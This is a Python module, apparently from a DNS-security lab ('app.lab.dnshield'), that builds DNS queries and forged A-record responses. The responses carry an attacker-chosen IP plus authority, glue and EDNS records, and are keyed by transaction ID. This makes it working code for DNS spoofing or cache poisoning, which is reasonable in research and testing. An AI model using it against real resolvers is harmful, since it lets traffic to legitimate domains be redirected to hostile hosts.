from __future__ import annotations

import socket
import struct
from typing import Callable


REFERENCE_QUERY_NAME = "app.lab.dnshield"
REFERENCE_TTL_SECONDS = 3600
REFERENCE_REAL_RESPONSE_DNS_PAYLOAD_HEX = (
    "789d8400000100010001000203617070036c616208646e736869656c640000010001"
    "c00c00010001000000780004c000020a"
    "c01000020001000000780006036e7331c010"
    "c03e00010001000000780004ac1e000a"
    "00002904d0000080000000"
)
REFERENCE_REAL_ANSWER_IP = "192.0.2.10"


def encode_qname(name: str):
    return b"".join(len(label).to_bytes(1, "big") + label.encode("ascii") for label in name.split(".")) + b"\x00"

def build_dns_query(txid: int, query_name: str):
    return (
        struct.pack("!HHHHHH", txid, 0x0100, 1, 0, 0, 0)
        + encode_qname(query_name)
        + struct.pack("!HH", 1, 1)
    )


def build_opt_record(udp_payload_size: int = 1232, ttl: int = 0x8000):
    return b"\x00" + struct.pack("!HHIH", 41, udp_payload_size, ttl, 0)


def build_compressed_name_suffix(label: str, target_zone_pointer: int):
    return len(label).to_bytes(1, "big") + label.encode("ascii") + struct.pack("!H", 0xC000 | target_zone_pointer)


def target_zone_pointer(query_name: str, target_zone: str):
    if target_zone == ".":
        return 12 + len(encode_qname(query_name)) - 1

    if query_name == target_zone:
        return 12

    suffix = f".{target_zone}"
    if not query_name.endswith(suffix):
        raise ValueError(f"query name {query_name} must be within target zone {target_zone}")

    first_label = query_name[: -len(suffix)]
    return 12 + 1 + len(first_label)


def build_nsd_template_forged_a_response_builder(
    query_name: str,
    forged_answer_ip: str,
):
    if query_name != REFERENCE_QUERY_NAME:
        raise ValueError(f"NSD template mode only supports {REFERENCE_QUERY_NAME}")

    payload_template = bytearray(bytes.fromhex(REFERENCE_REAL_RESPONSE_DNS_PAYLOAD_HEX))
    reference_ip_bytes = socket.inet_aton(REFERENCE_REAL_ANSWER_IP)
    forged_ip_bytes = socket.inet_aton(forged_answer_ip)
    answer_ip_offset = payload_template.find(reference_ip_bytes)
    if answer_ip_offset == -1:
        raise ValueError("could not find reference answer IP inside DNS payload template")

    payload_template[answer_ip_offset : answer_ip_offset + 4] = forged_ip_bytes
    payload_suffix = bytes(payload_template[2:])

    def build_response(txid: int):
        return txid.to_bytes(2, "big") + payload_suffix

    return build_response


def build_real_shaped_forged_a_response_builder(
    query_name: str,
    target_zone: str,
    authoritative_ip: str,
    forged_answer_ip: str,
):
    question = encode_qname(query_name) + struct.pack("!HH", 1, 1)
    zone_pointer = target_zone_pointer(query_name, target_zone)
    answer = (
        struct.pack("!H", 0xC00C)
        + struct.pack("!HHIH", 1, 1, REFERENCE_TTL_SECONDS, 4)
        + socket.inet_aton(forged_answer_ip)
    )
    authority_prefix = (
        struct.pack("!H", 0xC000 | zone_pointer)
        + struct.pack("!HHIH", 2, 1, REFERENCE_TTL_SECONDS, 6)
    )
    nameserver_name_offset = 12 + len(question) + len(answer) + len(authority_prefix)
    authority = authority_prefix + build_compressed_name_suffix("ns1", zone_pointer)
    glue = (
        struct.pack("!H", 0xC000 | nameserver_name_offset)
        + struct.pack("!HHIH", 1, 1, REFERENCE_TTL_SECONDS, 4)
        + socket.inet_aton(authoritative_ip)
    )
    opt = build_opt_record()
    payload_suffix = question + answer + authority + glue + opt

    def build_response(txid: int):
        return struct.pack("!HHHHHH", txid, 0x8400, 1, 1, 1, 2) + payload_suffix

    return build_response
